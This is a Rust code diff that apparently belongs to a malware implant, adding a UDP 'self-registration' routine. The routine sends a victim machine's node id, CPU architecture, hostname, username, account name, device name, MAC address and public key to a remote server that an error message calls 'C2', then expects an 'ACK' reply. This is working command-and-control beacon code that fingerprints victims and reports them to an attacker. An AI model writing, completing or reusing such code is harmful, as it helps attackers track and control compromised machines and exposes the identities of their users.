@@ -9,6 +9,7 @@ use crate::{
 };
 use hickory_resolver::Resolver;
 use std::net::Ipv4Addr;
+use tokio::net::UdpSocket;
 
 mod errors;
 mod types;
@@ -40,8 +41,57 @@ async fn register_self_udp(
     reach_info: &ReachInfo,
     identity: &Identity,
 ) -> Result<(), RegistrationError> {
+    let remote_addr =
+        std::net::SocketAddr::new(std::net::IpAddr::V4(reach_info.ipv4), reach_info.port);
 
-    // todo
+    let sock = UdpSocket::bind("0.0.0.0:0")
+        .await
+        .map_err(|err| RegistrationError::Connection(err))?;
+    sock.connect(remote_addr)
+        .await
+        .map_err(|err| RegistrationError::Connection(err))?;
+
+    let mut reg_buf: Vec<u8> = Vec::new();
+    
+    let write_string = |buf: &mut Vec<u8>, s: &str| {
+        let bytes = s.as_bytes();
+        let len = bytes.len() as u16;
+        buf.extend_from_slice(&len.to_be_bytes());
+        buf.extend_from_slice(bytes);
+    };
+    
+    let write_optional_string = |buf: &mut Vec<u8>, opt: &Option<String>| {
+        match opt {
+            Some(s) => write_string(buf, s),
+            None => buf.extend_from_slice(&0u16.to_be_bytes()),
+        }
+    };
+    
+    write_string(&mut reg_buf, &identity.nodus_id);
+    write_string(&mut reg_buf, &identity.cpu_arch);
+    write_optional_string(&mut reg_buf, &identity.hostname);
+    write_optional_string(&mut reg_buf, &identity.username);
+    write_optional_string(&mut reg_buf, &identity.account_name);
+    write_optional_string(&mut reg_buf, &identity.device_name);
+    write_optional_string(&mut reg_buf, &identity.mac_addr);
+    
+    let public_key = identity.asym_sec.get_public_key();
+    let public_key_len = public_key.len() as u16;
+    reg_buf.extend_from_slice(&public_key_len.to_be_bytes());
+    reg_buf.extend_from_slice(&public_key);
+
+    sock.send(&reg_buf).await.map_err(|err| RegistrationError::Communication(err))?;
+
+    let mut ack_buf = [0u8; 16];
+    let bytes_received = sock.recv(&mut ack_buf).await.map_err(|err| RegistrationError::Communication(err))?;
+    
+    if bytes_received == 0 {
+        return Err(RegistrationError::ServerSilence);
+    }
+
+    if bytes_received < 3 || &ack_buf[..3] != b"ACK" {
+        return Err(RegistrationError::Unknown("Invalid acknowledgement from C2".into()));
+    }
 
     Ok(())
 }
